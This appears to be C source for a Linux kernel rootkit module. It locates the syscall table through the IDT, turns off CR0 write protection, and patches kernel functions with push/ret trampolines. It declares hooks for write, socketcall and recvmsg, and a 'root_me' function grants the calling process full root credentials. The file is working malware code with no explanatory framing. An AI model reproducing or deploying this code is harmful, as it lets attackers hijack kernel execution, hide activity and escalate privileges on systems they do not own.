#define HIJACK_SIZE 6

#define DEBUG_HOOK(fmt, ...)

LIST_HEAD(hooked_syms);

struct sym_hook
{
    void *addr;
    unsigned char o_code[HIJACK_SIZE];
    unsigned char n_code[HIJACK_SIZE];
    struct list_head list;
};

struct ksym
{
    char *name;
    unsigned long addr;
};

struct
{
    unsigned short limit;
    unsigned long base;
} __attribute__ ((packed))idtr;

struct
{
    unsigned short off1;
    unsigned short sel;
    unsigned char none, flags;
    unsigned short off2;
} __attribute__ ((packed))idt;

asmlinkage ssize_t (*o_write)(int fd, const char __user *buff, ssize_t count);
asmlinkage ssize_t (*o_socketcall)(int call, unsigned long __user *args);
asmlinkage ssize_t (*o_sys_recvmsg)(int fd, struct msghdr __user *msg, unsigned flags);

void hijack_start(void *target, void *new);
void hijack_pause(void *target);
void hijack_resume(void *target);
void hijack_stop(void *target);

void *memmem ( const void *, size_t, const void *, size_t );


unsigned long *syscall_table;

unsigned long *find_sys_call_table ( void )
{
    char **p;
    unsigned long sct_off = 0;
    unsigned char code[255];

    asm("sidt %0":"=m" (idtr));
    memcpy(&idt, (void *)(idtr.base + 8 * 0x80), sizeof(idt));
    sct_off = (idt.off2 << 16) | idt.off1;
    memcpy(code, (void *)sct_off, sizeof(code));

    p = (char **)memmem(code, sizeof(code), "\xff\x14\x85", 3);

    if ( p )
        return *(unsigned long **)((char *)p + 3);
    else
        return NULL;
}

inline void** get_syscall_table_addr(void)
{
    if(syscall_table == NULL)
        syscall_table = (unsigned long*)find_sys_call_table();
    return (void**)syscall_table;
}

inline unsigned long disable_wp ( void )
{
    unsigned long cr0;

    preempt_disable();
    barrier();

    cr0 = read_cr0();
    write_cr0(cr0 & ~X86_CR0_WP);
    return cr0;
}

inline void restore_wp ( unsigned long cr0 )
{
    write_cr0(cr0);

    barrier();
    preempt_enable();
}


void hijack_start ( void *target, void *new )
{
    struct sym_hook *sa;
    unsigned char o_code[HIJACK_SIZE], n_code[HIJACK_SIZE];


    unsigned long o_cr0;

    memcpy(n_code, "\x68\x00\x00\x00\x00\xc3", HIJACK_SIZE);
    *(unsigned long *)&n_code[1] = (unsigned long)new;

    memcpy(o_code, target, HIJACK_SIZE);

    o_cr0 = disable_wp();
    memcpy(target, n_code, HIJACK_SIZE);
    restore_wp(o_cr0);

    sa = kmalloc(sizeof(*sa), GFP_KERNEL);
    if ( ! sa )
        return;

    sa->addr = target;
    memcpy(sa->o_code, o_code, HIJACK_SIZE);
    memcpy(sa->n_code, n_code, HIJACK_SIZE);

    list_add(&sa->list, &hooked_syms);
}

void hijack_pause ( void *target )
{
    struct sym_hook *sa;

    list_for_each_entry ( sa, &hooked_syms, list )
    if ( target == sa->addr )
    {
        unsigned long o_cr0 = disable_wp();
        memcpy(target, sa->o_code, HIJACK_SIZE);
        restore_wp(o_cr0);
    }
}

void hijack_resume ( void *target )
{
    struct sym_hook *sa;

    list_for_each_entry ( sa, &hooked_syms, list )
    if ( target == sa->addr )
    {
        unsigned long o_cr0 = disable_wp();
        memcpy(target, sa->n_code, HIJACK_SIZE);
        restore_wp(o_cr0);
    }
}

void hijack_stop ( void *target )
{
    struct sym_hook *sa;

    list_for_each_entry ( sa, &hooked_syms, list )
    if ( target == sa->addr )
    {
        unsigned long o_cr0 = disable_wp();
        memcpy(target, sa->o_code, HIJACK_SIZE);
        restore_wp(o_cr0);

        list_del(&sa->list);
        kfree(sa);
        break;
    }
}

void *memmem ( const void *haystack, size_t haystack_size, const void *needle, size_t needle_size )
{
    char *p;

    for ( p = (char *)haystack; p <= ((char *)haystack - needle_size + haystack_size); p++ )
        if ( memcmp(p, needle, needle_size) == 0 )
            return (void *)p;

    return NULL;
}

void root_me(void)
{
    struct cred * new_cred = prepare_creds();

    if(current->cred->uid==0)
    {
        return;
    }
    new_cred = prepare_creds();
    if (!new_cred)
    {
        return;
    }
    // change uid, gid to root id
    new_cred->uid = 0;
    new_cred->gid = 0;
    new_cred->euid = 0;
    new_cred->egid = 0;
    new_cred->fsuid = 0;
    new_cred->fsgid = 0;

    commit_creds(new_cred);
}
